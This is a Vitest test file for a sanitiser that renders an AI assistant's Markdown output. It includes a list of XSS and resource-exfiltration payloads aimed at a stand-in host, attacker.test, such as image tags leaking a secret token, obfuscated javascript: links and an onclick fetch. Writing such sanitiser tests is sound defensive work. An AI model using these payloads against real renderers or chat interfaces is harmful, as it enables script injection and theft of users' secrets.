import { describe, expect, it } from "vitest";
import { assistantMarkdownToRichPlainText, renderAssistantMarkdownHtml } from "@/assistant/chatArtifacts";

describe("assistant Markdown security boundary", () => {
  it("preserves safe Markdown formatting and safe links", () => {
    const html = renderAssistantMarkdownHtml("## Heading\n\n**bold** and [docs](https://example.test/docs)\n\n- one\n- two");
    expect(html).toContain("<h2>Heading</h2>");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain('href="https://example.test/docs"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(html).toContain("<ul>");
  });

  it.each([
    '<img src="https://attacker.test/x?secret=TOKEN">',
    '<img srcset="https://attacker.test/a 1x, https://attacker.test/b 2x">',
    '<svg><image href="https://attacker.test/svg"></image></svg>',
    '<math><mtext><img src="https://attacker.test/math"></mtext></math>',
    '<form action="https://attacker.test/post"><input name="secret"></form>',
    '<div style="background:url(https://attacker.test/css)">styled</div>',
    '<video poster="https://attacker.test/poster"><source src="https://attacker.test/v"></video>',
    '[image](javascript:alert(1))',
    '<a href="java&#x73;cript:alert(1)">bad</a>',
    '<a href="jav\nascript:alert(1)">bad</a>',
    '<iframe srcdoc="<img src=https://attacker.test/frame>"></iframe>',
    '![remote](https://attacker.test/markdown.png)',
  ])("blocks XSS or resource exfiltration in rendered and formatted-copy content: %s", (payload) => {
    const html = renderAssistantMarkdownHtml(payload);
    const plain = assistantMarkdownToRichPlainText(payload);
    expect(html).not.toMatch(/<(?:img|svg|math|form|input|video|source|iframe)\b/i);
    expect(html).not.toMatch(/(?:src|srcset|style|action|poster)\s*=/i);
    expect(html).not.toMatch(/javascript\s*:/i);
    expect(html).not.toContain("attacker.test");
    expect(plain).not.toContain("attacker.test");
  });

  it("removes event handlers and malformed protocol links while keeping their text", () => {
    const html = renderAssistantMarkdownHtml('<p onclick="fetch(`https://attacker.test`)"><a href="\u0000javascript:alert(1)">keep me</a></p>');
    expect(html).toBe("<p><a>keep me</a></p>");
  });
});
